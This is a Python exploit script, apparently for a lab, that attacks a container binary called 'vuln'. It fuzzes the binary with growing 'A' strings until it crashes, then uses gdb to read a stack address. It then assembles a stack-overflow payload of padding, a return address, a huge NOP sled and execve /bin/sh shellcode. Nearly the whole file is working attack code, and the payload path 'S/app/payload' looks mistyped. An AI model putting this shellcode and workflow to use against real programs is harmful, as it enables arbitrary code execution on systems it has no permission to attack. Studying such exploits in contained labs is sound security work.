import subprocess
import struct
import os
import re
import sys
import time
import base64



def stack_middle_address():

    trash_command = [
        'docker', 'exec', '-u', 'root', 'vuln_container', 'bash', '-c',
        'python3 -c \'import sys; trash=b"\\x42"*131000; sys.stdout.buffer.write(trash)\' > /app/trash'
    ]
    subprocess.run(trash_command, check=True, text=True, capture_output=True)

    trash_args = "`cat trash` " * 15    
    docker_exec_command = f"docker exec -i vuln_container gdb vuln"
    gdb_proc = subprocess.Popen(docker_exec_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    commands = f"""
    set disable-randomization off
    b vuln
    r {trash_args}
    info proc mapping
    q
    y
    """

    gdb_proc.stdin.write(commands)
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()

    # Find the line containing the word "stack" and extract the address in the middle
    output_lines = output.split('\n')
    stack_line = next((line for line in output_lines if 'stack' in line), None)
    
    if stack_line is None:
        print("GDB failed to find the stack line.")
        sys.exit(1)
    
    pattern = r'\b0x[0-9a-f]+\b'
    matches = re.findall(pattern, stack_line)
    
    start_address = int(matches[0], 16)
    end_address = int(matches[1], 16)
    
    middle = (start_address + end_address) // 2
    middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence

    return middle

def test_crash(input: str):
        
        # vuln_command = f"docker exec -i vuln_container echo -n {overflow} | ./vuln"
        # vuln_command = (
        # f"docker exec -i vuln_container bash -c "
        # f"'echo -n {overflow} | ./vuln; echo $? > /tmp/vuln_exit_code'"
        # )

        vuln_command = (
            f"echo -n '{input}' | docker exec -i vuln_container ./vuln; "
            f"echo $?"
        )
        vuln_proc = subprocess.Popen(vuln_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        output, _ = vuln_proc.communicate()
        parts = output.strip().split('\n')
        return int(parts[-1].strip())

def get_shellcode():
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
    return shellcode

def construct_payload(test_case: str):

    test_case += 'A'*4

    jmp_addr = stack_middle_address()

    payload = test_case.encode('utf-8')
    payload += struct.pack("<I", jmp_addr)
    payload += b'\x90' * 200000
    payload += get_shellcode()


    with subprocess.Popen(
        ['docker', 'exec', '-i', 'vuln_container', 'bash', '-c', 'cat > S/app/payload'],
        stdin=subprocess.PIPE,
        text=False  #working with binary input not text
    ) as proc:
        # Write the payload to the container's stdin
        proc.stdin.write(payload)
        proc.stdin.close()
        proc.wait()



def main():

    if len(sys.argv) != 2:
        print("No docker image provided")
        sys.exit(1) 

    docker_image = sys.argv[1]
    #run docker container from input
    docker_command = f"docker run --rm --privileged --name vuln_container -dit {docker_image}"
    subprocess.Popen(docker_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)


    test_case = "A"           #replace with a test generating method
    while True:
        exit_code = test_crash(test_case)
        print(exit_code)

        if exit_code == 139:
            print("segmentation fault")
            construct_payload(test_case)

            # while True:
            #     break
            break

        else:
            test_case += "A"



    subprocess.Popen("docker kill vuln_container", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


if __name__ == "__main__":
    main()